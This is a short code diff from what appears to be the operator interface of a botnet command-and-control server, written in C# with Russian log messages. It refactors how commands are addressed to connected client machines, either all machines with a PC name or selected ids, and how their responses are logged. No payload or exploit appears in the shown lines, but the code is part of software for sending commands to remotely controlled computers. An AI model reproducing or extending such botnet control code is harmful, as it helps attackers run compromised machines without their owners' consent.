@@ -186,9 +186,9 @@ namespace BotNet_Server_UI
                 Command message = new Command()
                 {
                     command = command,
-                    ids = ipsall ? arr.Where(x => x.nameofpc != string.Empty).Select(x => x.id.ToString()).ToArray() : ips
+                    Clients = ipsall ? arr.Where(x => x.nameofpc != string.Empty).ToList() : Array.FindAll(arr, x => Array.Find(ips, y => y == Convert.ToString(x.id)) != null).ToList()
                 };
-                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Создан экземпляр Message: Команда {message.command} / ID {message.ids}\r\n";
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Создан экземпляр Message: Команда {message.command} / ID {message.Clients}\r\n";
                 m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Отправлен ApiRequest.Create(command) на command\r\n";
                 Uri res = await ApiRequest.CreateProductAsync(message, "command");
                 LogPanel.Text += $"({DateTime.Now.ToLongTimeString()}) Команда {showcommand} (id: {await ApiRequest.GetProductAsync<uint>($"api/command") - 1}) отправлена.\r\n";
@@ -344,7 +344,7 @@ namespace BotNet_Server_UI
 
         private async void SetResponse(Response response)
         {
-            await Task.Run(async() => await LogPanel.Dispatcher.BeginInvoke(new Action(() => LogPanel.Text += "(" + DateTime.Now.ToLongTimeString() + ") id: " + response.id + " / " + response.response + "\n")));
+            await Task.Run(async() => await LogPanel.Dispatcher.BeginInvoke(new Action(() => LogPanel.Text += "(" + DateTime.Now.ToLongTimeString() + ") id: " + response.cid + " / " + response.response + "\n")));
         }
 
         private void IPSetButton_Click(object sender, RoutedEventArgs e)
